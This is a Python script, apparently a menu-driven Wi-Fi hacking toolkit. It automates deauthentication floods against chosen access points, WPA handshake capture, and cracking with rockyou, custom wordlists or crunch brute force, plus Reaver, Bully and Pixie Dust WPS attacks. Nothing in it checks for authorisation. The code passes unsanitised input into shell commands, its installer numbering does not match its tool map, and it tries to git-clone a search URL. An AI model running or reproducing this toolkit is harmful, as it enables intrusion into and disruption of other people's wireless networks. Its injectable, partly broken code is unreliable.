# coding: utf-8
#!/usr/bin/env python
import os
import subprocess
import sys
import time
from subprocess import check_call, CalledProcessError

def run_command(command, shell=False):
    """Execute command with proper error handling"""
    try:
        if shell:
            result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        else:
            result = subprocess.run(command, check=True, capture_output=True, text=True)
        return result
    except CalledProcessError as e:
        print(f"Error executing command: {e}")
        print(f"Error output: {e.stderr}")
        return None
    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def install_tools():
    """Install necessary tools with better feedback"""
    print("\nInstalling Needed Tools...")
    print("This may take a few minutes...\n")
    
    tools = ["aircrack-ng", "crunch", "xterm", "wordlists", "reaver", "pixiewps", "bully", "wifite"]
    
    for tool in tools:
        print(f"Installing {tool}...")
        result = run_command(f"apt-get install -y {tool}", shell=True)
        if result and result.returncode == 0:
            print(f"✓ {tool} installed successfully")
        else:
            print(f"✗ Failed to install {tool}")
    
    time.sleep(2)
    os.system("clear")

def check_dependencies():
    """Check if required tools are installed"""
    required_tools = ["aircrack-ng", "crunch", "reaver", "bully", "wifite"]
    missing_tools = []
    
    for tool in required_tools:
        result = run_command(f"which {tool}", shell=True)
        if not result or result.returncode != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"Missing tools: {', '.join(missing_tools)}")
        print("Please install them first or use option 5 to install wireless tools")
        return False
    return True

def get_interface(default="wlan0"):
    """Get interface from user with default value"""
    interface = input(f"\nEnter the interface (Default: {default}): ").strip()
    return interface if interface else default

def get_bssid():
    """Get BSSID from user with validation"""
    while True:
        bssid = input("\nEnter the BSSID of the target (format: XX:XX:XX:XX:XX:XX): ").strip()
        if len(bssid) == 17 and bssid.count(':') == 5:
            return bssid
        else:
            print("Invalid BSSID format. Please use format: XX:XX:XX:XX:XX:XX")

def monitor_mode():
    """Start monitor mode"""
    if not check_dependencies():
        return
    
    interface = get_interface()
    print(f"\nStarting monitor mode on {interface}...")
    
    commands = [
        f"airmon-ng check kill",
        f"airmon-ng start {interface}",
        f"airmon-ng check kill"  # Double check
    ]
    
    for cmd in commands:
        result = run_command(cmd, shell=True)
        if not result:
            print(f"Failed to execute: {cmd}")
            return
    
    print(f"✓ Monitor mode started successfully")
    time.sleep(2)

def stop_monitor_mode():
    """Stop monitor mode"""
    interface = get_interface("wlan0mon")
    print(f"\nStopping monitor mode on {interface}...")
    
    commands = [
        f"airmon-ng stop {interface}",
        "service network-manager restart"
    ]
    
    for cmd in commands:
        result = run_command(cmd, shell=True)
        if not result:
            print(f"Failed to execute: {cmd}")
    
    print("✓ Monitor mode stopped and network manager restarted")
    time.sleep(2)

def scan_networks():
    """Scan for Wi-Fi networks"""
    if not check_dependencies():
        return
    
    interface = get_interface("wlan0mon")
    print(f"\nScanning networks with {interface}...")
    print("Press Ctrl+C when done to return to menu\n")
    
    try:
        run_command(f"airodump-ng {interface} -M", shell=True)
    except KeyboardInterrupt:
        print("\nScan stopped by user")
    time.sleep(2)

def get_handshake():
    """Capture handshake"""
    if not check_dependencies():
        return
    
    interface = get_interface("wlan0mon")
    
    print("\nFirst, let's scan for networks...")
    print("Note: Look for networks with high DATA rate for better results")
    print("Press Ctrl+C when you find your target\n")
    time.sleep(3)
    
    try:
        run_command(f"airodump-ng {interface} -M", shell=True)
    except KeyboardInterrupt:
        pass
    
    bssid = get_bssid()
    channel = input("\nEnter the channel of the network: ").strip()
    
    # Validate path
    while True:
        path = input("\nEnter the path for output file (without extension): ").strip()
        if path:
            break
        print("Please enter a valid path")
    
    print("\nEnter the number of deauth packets [1-10000] (0 for unlimited)")
    print("Recommended: 10-50 for testing, more if far from target")
    
    try:
        deauth_count = int(input("Deauth packets: ").strip())
    except ValueError:
        deauth_count = 0
    
    print(f"\nStarting handshake capture on {bssid}...")
    print("Press Ctrl+C to stop capture\n")
    
    # Start airodump-ng in background
    airodump_cmd = f"xterm -e airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} &"
    run_command(airodump_cmd, shell=True)
    
    time.sleep(5)  # Give airodump time to start
    
    # Start deauth attack
    if deauth_count > 0:
        deauth_cmd = f"aireplay-ng -0 {deauth_count} -a {bssid} {interface}"
        run_command(deauth_cmd, shell=True)
    else:
        deauth_cmd = f"xterm -e aireplay-ng -0 0 -a {bssid} {interface} &"
        run_command(deauth_cmd, shell=True)
    
    input("\nPress Enter when you have captured the handshake (or to cancel)...")
    
    # Kill background processes
    run_command("pkill -f airodump-ng", shell=True)
    run_command("pkill -f aireplay-ng", shell=True)
    
    print("Handshake capture completed")
    time.sleep(2)

def wireless_tools_menu():
    """Wireless tools installation menu"""
    def show_menu():
        os.system("clear")
        print("""\033[1;32m
Wireless Tools Installation Menu
--------------------------------
1) Aircrack-ng                          17) kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) mdk3
5) Bluepot                              21) mfcuk
6) BlueRanger                           22) mfoc
7) Bluesnarfer                          23) mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) crackle                             26) Reaver
11) eapmd5pass                          27) redfang
12) Fern Wifi Cracker                   28) RTLSDR Scanner
13) Ghost Phisher                       29) Spooftooph
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) gr-scan
16) Wifite                              32) Back to main menu
90) airgeddon
91) wifite v2

0) Install all wireless tools
""")
    
    tools_map = {
        1: "aircrack-ng", 2: "asleap", 3: "bluelog", 4: "bluemaho", 
        5: "bluepot", 6: "blueranger", 7: "bluesnarfer", 8: "bully",
        9: "cowpatty", 10: "crackle", 11: "eapmd5pass", 12: "fern-wifi-cracker",
        13: "ghost-phisher", 14: "giskismet", 15: "wifitap", 16: "kalibrate-rtl",
        17: "killerbee", 18: "kismet", 19: "mdk3", 20: "mfcuk",
        21: "mfoc", 22: "mfterm", 23: "multimon-ng", 24: "pixiewps",
        25: "reaver", 26: "redfang", 27: "rtlsdr-scanner", 28: "spooftooph",
        29: "wifi-honey", 30: "wifite", 31: "gr-scan",
        90: "airgeddon-git", 91: "wifite2-git"
    }
    
    while True:
        show_menu()
        try:
            choice = int(input("\nEnter The number of the tool : >>> "))
        except ValueError:
            print("Invalid input. Please enter a number.")
            time.sleep(2)
            continue
        
        if choice == 0:
            print("Installing all wireless tools...")
            all_tools = " ".join([tool for tool in tools_map.values() if "git" not in tool])
            run_command(f"apt-get update && apt-get install -y {all_tools}", shell=True)
        elif choice == 32:
            return
        elif choice == 90:
            run_command("git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git", shell=True)
            print("Airgeddon cloned to current directory")
        elif choice == 91:
            run_command("git clone https://github.com/derv82/wifite2.git", shell=True)
            print("Wifite2 cloned to current directory")
        elif choice in tools_map:
            tool = tools_map[choice]
            if "git" in tool:
                repo_name = tool.replace("-git", "")
                run_command(f"git clone https://github.com/search?q={repo_name}", shell=True)
                print(f"{repo_name} cloned to current directory")
            else:
                run_command(f"apt-get update && apt-get install -y {tool}", shell=True)
        else:
            print("Invalid choice. Please try again.")
        
        input("\nPress Enter to continue...")

def crack_handshake_rockyou():
    """Crack handshake using rockyou.txt"""
    if not check_dependencies():
        return
    
    handshake_file = input("\nEnter the path of the handshake file (.cap): ").strip()
    
    if not os.path.exists(handshake_file):
        print("Handshake file not found!")
        return
    
    rockyou_path = "/usr/share/wordlists/rockyou.txt"
    rockyou_gz = "/usr/share/wordlists/rockyou.txt.gz"
    
    if os.path.exists(rockyou_gz) and not os.path.exists(rockyou_path):
        print("Extracting rockyou.txt.gz...")
        run_command(f"gzip -d {rockyou_gz}", shell=True)
    
    if not os.path.exists(rockyou_path):
        print("rockyou.txt not found. Please install kali-wordlists package.")
        return
    
    print(f"\nStarting crack with rockyou.txt...")
    print("This may take a long time. Press Ctrl+C to stop.\n")
    
    try:
        run_command(f"aircrack-ng {handshake_file} -w {rockyou_path}", shell=True)
    except KeyboardInterrupt:
        print("\nCracking stopped by user")
    
    input("\nPress Enter to continue...")

def crack_handshake_wordlist():
    """Crack handshake with custom wordlist"""
    if not check_dependencies():
        return
    
    handshake_file = input("\nEnter the path of the handshake file (.cap): ").strip()
    wordlist_file = input("\nEnter the path of the wordlist: ").strip()
    
    if not os.path.exists(handshake_file):
        print("Handshake file not found!")
        return
    
    if not os.path.exists(wordlist_file):
        print("Wordlist file not found!")
        return
    
    print(f"\nStarting crack with custom wordlist...")
    print("This may take a long time. Press Ctrl+C to stop.\n")
    
    try:
        run_command(f"aircrack-ng {handshake_file} -w {wordlist_file}", shell=True)
    except KeyboardInterrupt:
        print("\nCracking stopped by user")
    
    input("\nPress Enter to continue...")

def crack_handshake_no_wordlist():
    """Crack handshake without wordlist using crunch"""
    if not check_dependencies():
        return
    
    essid = input("\nEnter the ESSID of the network: ").strip()
    handshake_file = input("\nEnter the path of the handshake file (.cap): ").strip()
    
    if not os.path.exists(handshake_file):
        print("Handshake file not found!")
        return
    
    try:
        min_len = int(input("\nEnter the minimum length of the password (8-64): "))
        max_len = int(input("Enter the maximum length of the password (8-64): "))
    except ValueError:
        print("Invalid length values!")
        return
    
    print("""
Character Sets:
1) Lowercase chars (abcdefghijklmnopqrstuvwxyz)
2) Uppercase chars (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
3) Numeric chars (0123456789)
4) Symbol chars (!#$%/=?{}[]-*:;)
5) Lowercase + uppercase chars
6) Lowercase + numeric chars
7) Uppercase + numeric chars
8) Symbol + numeric chars
9) Lowercase + uppercase + numeric chars
10) Lowercase + uppercase + symbol chars
11) Lowercase + uppercase + numeric + symbol chars
12) Custom character set
""")
    
    char_sets = {
        "1": "abcdefghijklmnopqrstuvwxyz",
        "2": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "3": "0123456789",
        "4": "!#$%/=?{}[]-*:;",
        "5": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "6": "abcdefghijklmnopqrstuvwxyz0123456789",
        "7": "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "8": "!#$%/=?{}[]-*:;0123456789",
        "9": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "10": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;",
        "11": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;"
    }
    
    choice = input("\nChoose character set (1-12): ").strip()
    
    if choice == "12":
        charset = input("Enter your custom character set: ")
    elif choice in char_sets:
        charset = char_sets[choice]
    else:
        print("Invalid choice!")
        return
    
    print("\nWarning: This can take a VERY long time!")
    print("Starting brute force attack...\n")
    
    try:
        # Use crunch to generate passwords and pipe to aircrack-ng
        cmd = f"crunch {min_len} {max_len} {charset} | aircrack-ng {handshake_file} -e '{essid}' -w-"
        run_command(cmd, shell=True)
    except KeyboardInterrupt:
        print("\nBrute force stopped by user")
    
    input("\nPress Enter to continue...")

def create_wordlist():
    """Create custom wordlist using crunch"""
    if not check_dependencies():
        return
    
    try:
        min_len = int(input("\nEnter the minimum length of the password: "))
        max_len = int(input("Enter the maximum length of the password: "))
    except ValueError:
        print("Invalid length values!")
        return
    
    output_file = input("\nEnter the path for the output file: ").strip()
    charset = input("Enter the characters to include in wordlist: ").strip()
    
    if not charset:
        print("Character set cannot be empty!")
        return
    
    print(f"\nGenerating wordlist... This may take a while.")
    
    cmd = f"crunch {min_len} {max_len} {charset} -o {output_file}"
    result = run_command(cmd, shell=True)
    
    if result and result.returncode == 0:
        print(f"✓ Wordlist created successfully: {output_file}")
    else:
        print("✗ Failed to create wordlist")
    
    time.sleep(2)

def wps_attacks():
    """WPS attack menu"""
    if not check_dependencies():
        return
    
    print("""
WPS Attack Methods:
1) Reaver (Standard WPS attack)
2) Bully (Alternative WPS attack)
3) Wifite (Automated, recommended)
4) PixieWPS (Pixie Dust attack)

0) Back to Main Menu
""")
    
    try:
        choice = int(input("Choose attack method: "))
    except ValueError:
        print("Invalid choice!")
        return
    
    if choice == 0:
        return
    
    interface = get_interface("wlan0mon")
    
    if choice in [1, 2, 4]:
        bssid = get_bssid()
    
    if choice == 1:
        # Reaver attack
        cmd = f"reaver -i {interface} -b {bssid} -vv"
        print(f"Starting Reaver attack on {bssid}...")
    elif choice == 2:
        # Bully attack
        try:
            channel = int(input("Enter the channel: "))
        except ValueError:
            channel = ""
        
        if channel:
            cmd = f"bully -b {bssid} -c {channel} {interface}"
        else:
            cmd = f"bully -b {bssid} {interface}"
        print(f"Starting Bully attack on {bssid}...")
    elif choice == 3:
        # Wifite
        cmd = "wifite"
        print("Starting Wifite...")
    elif choice == 4:
        # PixieWPS
        cmd = f"reaver -i {interface} -b {bssid} -K"
        print(f"Starting PixieWPS attack on {bssid}...")
    else:
        print("Invalid choice!")
        return
    
    try:
        run_command(cmd, shell=True)
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    
    input("\nPress Enter to continue...")

def scan_wps_networks():
    """Scan for WPS-enabled networks"""
    if not check_dependencies():
        return
    
    interface = get_interface("wlan0mon")
    
    print(f"\nScanning for WPS-enabled networks with {interface}...")
    print("Press Ctrl+C to stop scan\n")
    
    try:
        run_command(f"airodump-ng {interface} -M --wps", shell=True)
    except KeyboardInterrupt:
        print("\nScan stopped by user")
    
    input("\nPress Enter to continue...")

def about_me():
    """Display about information"""
    os.system("clear")
    print("""
About Me
--------
Hi, I'm ATHEX - Ethical Hacker and Cyber Security Researcher.

Specialties:
- Wireless Security
- Penetration Testing
- Cyber Security Research

Contact:
- WhatsApp: +92 349 0916663
- Instagram: @itx_athex86
- YouTube: inziXploit444

Feel free to contact me for collaborations or questions!
""")
    input("\nPress Enter to return to main menu...")

def intro():
    """Main menu"""
    # Install tools on first run
    if not check_dependencies():
        print("Some required tools are missing. Please install them using option 5.")
    
    while True:
        os.system("clear")
        print("""\033[1;32m
---------------------------------------------------------------------------------------
                                                                                                          
@@@  @@@  @@@  @@@  @@@@@@@@  @@@             @@@@@@@@  @@@  @@@   @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   
@@@  @@@  @@@  @@@  @@@@@@@@  @@@             @@@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  
@@!  @@!  @@!  @@!  @@!       @@!             @@!       @@!  @@@  !@@       @@!  !@@  @@!       @@!  @@@  
!@!  !@!  !@!  !@!  !@!       !@!             !@!       !@!  @!@  !@!       !@!  @!!  !@!       !@!  @!@  
@!!  !!@  @!@  !!@  @!!!:!    !!@  @!@!@!@!@  @!!!:!    @!@  !@!  !@!       @!@@!@!   @!!!:!    @!@!!@!   
!@!  !!!  !@!  !!!  !!!!!:    !!!  !!!@!@!!!  !!!!!:    !@!  !!!  !!!       !!@!!!    !!!!!:    !!@!@!    
!!:  !!:  !!:  !!:  !!:       !!:             !!:       !!:  !!!  :!!       !!: :!!   !!:       !!: :!!   
:!:  :!:  :!:  :!:  :!:       :!:             :!:       :!:  !:!  :!:       :!:  !:!  :!:       :!:  !:!  
 :::: :: :::    ::   ::        ::              ::       ::::: ::   ::: :::   ::  :::   :: ::::  ::   :::  
  :: :  : :    :     :        :                :         : :  :    :: :: :   :   :::  : :: ::    :   : :  
                              WI-FI HACKING TOOL KIT
     CREATED BY ATHEX     
            WHATSAPP-  +92 3490916663                                                                                              
                        insta- itx_athex86      
                                YT - inziXploit444                               
---------------------------------------------------------------------------------------                                                                     
(1) Start monitor mode       
(2) Stop monitor mode                        
(3) Scan Networks                            
(4) Capture Handshake (monitor mode needed)   
(5) Install Wireless tools                   
(6) Crack Handshake with rockyou.txt
(7) Crack Handshake with custom wordlist
(8) Crack Handshake without wordlist (Brute force)
(9) Create wordlist                                     
(10) WPS Networks attacks
(11) Scan for WPS Networks

(0) About Me
(00) Exit
-----------------------------------------------------------------------
""")
        
        try:
            choice = input("\nEnter your choice: ").strip()
            
            if choice == "1":
                monitor_mode()
            elif choice == "2":
                stop_monitor_mode()
            elif choice == "3":
                scan_networks()
            elif choice == "4":
                get_handshake()
            elif choice == "5":
                wireless_tools_menu()
            elif choice == "6":
                crack_handshake_rockyou()
            elif choice == "7":
                crack_handshake_wordlist()
            elif choice == "8":
                crack_handshake_no_wordlist()
            elif choice == "9":
                create_wordlist()
            elif choice == "10":
                wps_attacks()
            elif choice == "11":
                scan_wps_networks()
            elif choice == "0":
                about_me()
            elif choice == "00":
                print("Goodbye!")
                break
            else:
                print("Invalid choice! Please try again.")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n\nGoodbye!")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            time.sleep(2)

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print("This script must be run as root!")
        sys.exit(1)
    
    # Initial setup
    install_tools()
    intro()
